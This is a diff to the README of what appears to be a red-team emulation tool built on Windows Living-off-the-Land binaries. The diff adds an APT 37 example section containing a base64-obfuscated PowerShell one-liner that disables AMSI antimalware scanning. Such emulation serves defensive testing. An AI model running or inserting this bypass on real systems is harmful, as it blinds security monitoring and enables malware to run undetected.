@@ -8,7 +8,7 @@ of Living-off-the-Land binaries native to the Windows Operating System.
 ## Inspiration
 This project is highly inspired by [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and aims to expand beyond the scope of that by eliminating atomicity in individual test cases and providing flexibility in customization.
 
-## Featues
+## Features
 * LOLBins Chaining
 * Self-Cleanup & Auto Destruct
 * Commandline Obfuscation
@@ -70,9 +70,17 @@ Mshta.exe | 3 | `Execute` `Download`
 Wuauclt.exe | 1 | `Execute`
 Eventvwr.exe | 1 | `UAC Bypass`
 Pcalua.exe | 2 | `Execute`
+Forfiles.exe | 1 | `Execute`
 Wmic.exe | 3 | `Execute`
 Cmd.exe | 1 | `Execute`
 Powershell.exe | 4 | `Execute`
+**TOTAL** | **49** | 
+
+## APT Prodecural Examples
+### APT 37
+**STEEP#MAVERICK: New Covert Attack Campaign Targeting Military Contractors**
+1. AMSI Bypass via Base64 Encoding
+  `powershell.exe -c "[Ref].Assembly.GetType(''System.Management.Automation.''+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(''QQBtAHMAaQBVAHQAaQBsAHMA'')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(''YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==''))),''NonPublic,Static'').SetValue($null,$true)"`
 
 ## To-Do
 - [X] Export Report + JSON
